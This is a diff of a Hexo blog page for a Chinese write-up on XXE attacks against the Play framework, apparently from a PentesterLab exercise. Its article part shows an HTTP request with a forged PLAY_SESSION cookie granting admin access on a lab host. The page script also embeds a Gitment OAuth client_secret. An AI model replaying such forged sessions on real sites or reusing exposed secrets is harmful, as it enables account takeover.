-<img src="/2017/04/21/play渗透框架XXE实体攻击/admin.png" alt="admin.png" title="">
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 10.211.55.14</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0 FirePHP/0.7.4</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">x-insight: activate</span><br><span class="line">Cookie: PLAY_SESSION=&quot;a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin&quot;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
+<img src="/2017/04/21/play渗透框架XXE实体攻击/admin.png">
 <h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>XXE注入的本质是网站允许提交xml内容，而后台处理xml时不规范导致存在解析了xml内容中的外部实体。因此，如果网站允许提交xml内容，则可能存在XXE注入漏洞。</p>
 <h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
-<li><a href="https://pentesterlab.com/exercises/play_xxe/course" target="_blank" rel="external">https://pentesterlab.com/exercises/play_xxe/course</a></li>
-<li><a href="http://www.freebuf.com/vuls/83599.html" target="_blank" rel="external">freebuf Play框架的XML Entity Exploit</a></li>
-<li><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review.html" target="_blank" rel="external">XML实体攻击回顾</a></li>
+<li><a href="https://pentesterlab.com/exercises/play_xxe/course" target="_blank" rel="noopener">https://pentesterlab.com/exercises/play_xxe/course</a></li>
+<li><a href="http://www.freebuf.com/vuls/83599.html" target="_blank" rel="noopener">freebuf Play框架的XML Entity Exploit</a></li>
+<li><a href="http://rickgray.me/2015/06/08/xml-entity-attack-review.html" target="_blank" rel="noopener">XML实体攻击回顾</a></li>
 </ul>
 
       
     </div>
+    
+    
+    
 
-    <div>
-      
-        
+    
 
-      
-    </div>
+    
 
-    <div>
-      
-        
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    Ethan
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://www.beesfun.com/2017/04/21/play渗透框架XXE实体攻击/" title="play渗透框架XXE实体攻击">http://www.beesfun.com/2017/04/21/play渗透框架XXE实体攻击/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
 
-      
-    </div>
-
+      </div>
+    
 
     <footer class="post-footer">
       
@@ -488,7 +510,7 @@
       
 
       
-        
+      
       
 
       
@@ -516,6 +538,10 @@
       
       
     </footer>
+  </div>
+  
+  
+  
   </article>
 
 
@@ -525,15 +551,22 @@
     </div>
   </div>
 
-          
+
           </div>
           
 
 
           
-  <div class="comments" id="comments">
-    
-  </div>
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
 
 
         </div>
@@ -549,110 +582,116 @@
   </div>
 
   <aside id="sidebar" class="sidebar">
+    
     <div class="sidebar-inner">
 
       
 
       
         <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
             文章目录
           </li>
-          <li class="sidebar-nav-overview" data-target="site-overview">
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
             站点概览
           </li>
         </ul>
       
 
-      <section class="site-overview sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" itemprop="image"
-               src="https://avatars3.githubusercontent.com/u/15061633"
-               alt="Ethan" />
-          <p class="site-author-name" itemprop="name">Ethan</p>
-           
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://avatars3.githubusercontent.com/u/15061633"
+                alt="Ethan" />
+            
+              <p class="site-author-name" itemprop="name">Ethan</p>
               <p class="site-description motion-element" itemprop="description">personal blog :)</p>
-          
-        </div>
-        <nav class="site-state motion-element">
-
-          
-            <div class="site-state-item site-state-posts">
-              <a href="/archives">
-                <span class="site-state-item-count">46</span>
-                <span class="site-state-item-name">日志</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-categories">
-              <a href="/categories/index.html">
-                <span class="site-state-item-count">14</span>
-                <span class="site-state-item-name">分类</span>
-              </a>
-            </div>
-          
-
-          
-            
-            
-            <div class="site-state-item site-state-tags">
-              <a href="/tags/index.html">
-                <span class="site-state-item-count">56</span>
-                <span class="site-state-item-name">标签</span>
-              </a>
-            </div>
-          
-
-        </nav>
-
-        
-
-        <div class="links-of-author motion-element">
-          
-            
-              <span class="links-of-author-item">
-                <a href="https://github.com/hxer/" target="_blank" title="GitHub">
-                  
-                    <i class="fa fa-fw fa-github"></i>
-                  
-                  GitHub
-                </a>
-              </span>
-            
-          
-        </div>
-
-        
-        
-
-        
-        
-          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-            <div class="links-of-blogroll-title">
-              <i class="fa  fa-fw fa-globe"></i>
-              友链
-            </div>
-            <ul class="links-of-blogroll-list">
-              
-                <li class="links-of-blogroll-item">
-                  <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
-                  <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
-                </li>
-              
-            </ul>
           </div>
-        
 
-        
+          <nav class="site-state motion-element">
 
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">46</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
 
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/hxer/" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://badcode.cc/" title="badcode" target="_blank">badcode</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.wupco.cn" title="wupco" target="_blank">wupco</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://danaive.github.io" title="danlei" target="_blank">danlei</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
       </section>
 
       
@@ -685,30 +724,45 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright" >
-  
-  &copy;  2017 - 
-  <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
-    <i class="fa fa-heart"></i>
+    <i class="fa fa-user"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">Ethan</span>
+
+  
 </div>
 
 
-<div class="powered-by">
-  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
-</div>
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
 
-<div class="theme-info">
-  主题 -
-  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
-    NexT.Pisces
-  </a>
-</div>
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
 
 
         
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=63078337";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
 
         
       </div>
@@ -720,7 +774,9 @@
         
       </div>
     
+
     
+
   </div>
 
   
@@ -744,59 +800,78 @@
 
 
 
-  
-  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-
-  
-  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-
-  
-  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-
-  
-  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
 
 
-  
 
 
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
 
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
 
 
 
   
   
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
 
 
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.0"></script>
+  
 
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
 
 
 
   
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
 
 
 
   
 
 
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
 
 
 
   
-
 
 
   
@@ -822,161 +897,371 @@
 
 
 
-  
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://aimingoo.github.io/gitmint/style/default.css">
+        <script src="https://aimingoo.github.io/gitmint/dist/gitmint.browser.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitmint({
+            id: window.location.pathname, 
+            owner: 'hxer',
+            repo: 'hxer.github.io',
+            
+            lang: "" || navigator.language || navigator.systemLanguage || navigator.userLanguage,
+            
+            oauth: {
+            
+            
+                client_secret: '7147116f4ae9df31961313af13fad164bdbf0fe3',
+            
+                client_id: 'ac1236f9efefa7d5580f'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
 
 
 
+
+
+
+
   
-  
+
   <script type="text/javascript">
     // Popup Window;
     var isfetched = false;
+    var isXml = true;
     // Search DB path;
     var search_path = "search.xml";
-    if (search_path.length == 0) {
+    if (search_path.length === 0) {
       search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
     }
     var path = "/" + search_path;
     // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
 
     function proceedsearch() {
       $("body")
         .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
         .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
       $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
     }
+
     // search function;
     var searchFunc = function(path, search_id, content_id) {
       'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
       $.ajax({
         url: path,
-        dataType: "xml",
+        dataType: isXml ? "xml" : "json",
         async: true,
-        success: function( xmlResponse ) {
+        success: function(res) {
           // get the contents from search data
           isfetched = true;
           $('.popup').detach().appendTo('.header-inner');
-          var datas = $( "entry", xmlResponse ).map(function() {
+          var datas = isXml ? $("entry", res).map(function() {
             return {
-              title: $( "title", this ).text(),
+              title: $("title", this).text(),
               content: $("content",this).text(),
-              url: $( "url" , this).text()
+              url: $("url" , this).text()
             };
-          }).get();
-          var $input = document.getElementById(search_id);
-          var $resultContent = document.getElementById(content_id);
-          $input.addEventListener('input', function(){
-            var matchcounts = 0;
-            var str='<ul class=\"search-result-list\">';
-            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-            $resultContent.innerHTML = "";
-            if (this.value.trim().length > 1) {
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
               // perform local searching
               datas.forEach(function(data) {
                 var isMatch = false;
-                var content_index = [];
-                var data_title = data.title.trim().toLowerCase();
-                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
-                var data_url = decodeURIComponent(data.url);
-                var index_title = -1;
-                var index_content = -1;
-                var first_occur = -1;
-                // only match artiles with not empty titles and contents
-                if(data_title != '') {
-                  keywords.forEach(function(keyword, i) {
-                    index_title = data_title.indexOf(keyword);
-                    index_content = data_content.indexOf(keyword);
-                    if( index_title >= 0 || index_content >= 0 ){
-                      isMatch = true;
-                      if (i == 0) {
-                        first_occur = index_content;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
                       }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
                     }
 
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                   });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
                 }
+
                 // show search results
+
                 if (isMatch) {
-                  matchcounts += 1;
-                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
-                  var content = data.content.trim().replace(/<[^>]+>/g,"");
-                  if (first_occur >= 0) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
                     // cut out 100 characters
-                    var start = first_occur - 20;
-                    var end = first_occur + 80;
+                    var start = position - 20;
+                    var end = position + 80;
                     if(start < 0){
                       start = 0;
                     }
-                    if(start == 0){
-                      end = 50;
+                    if (end < position + word.length) {
+                      end = position + word.length;
                     }
                     if(end > content.length){
                       end = content.length;
                     }
-                    var match_content = content.substring(start, end);
-                    // highlight all keywords
-                    keywords.forEach(function(keyword){
-                      var regS = new RegExp(keyword, "gi");
-                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
-                    });
-
-                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                   }
-                  str += "</li>";
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
                 }
-              })};
-            str += "</ul>";
-            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
-            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
-            $resultContent.innerHTML = str;
-          });
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
           proceedsearch();
         }
-      });}
+      });
+    }
 
     // handle and trigger popup window;
     $('.popup-trigger').click(function(e) {
       e.stopPropagation();
-      if (isfetched == false) {
+      if (isfetched === false) {
         searchFunc(path, 'local-search-input', 'local-search-result');
       } else {
         proceedsearch();
       };
     });
 
-    $('.popup-btn-close').click(function(e){
-      $('.popup').hide();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    });
+    $('.popup-btn-close').click(onPopupClose);
     $('.popup').click(function(e){
       e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
     });
   </script>
 
 
-  
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-  
 
 
   
@@ -985,6 +1270,12 @@
 
   
 
+  
+  
+
+  
+
+  
 
   
 
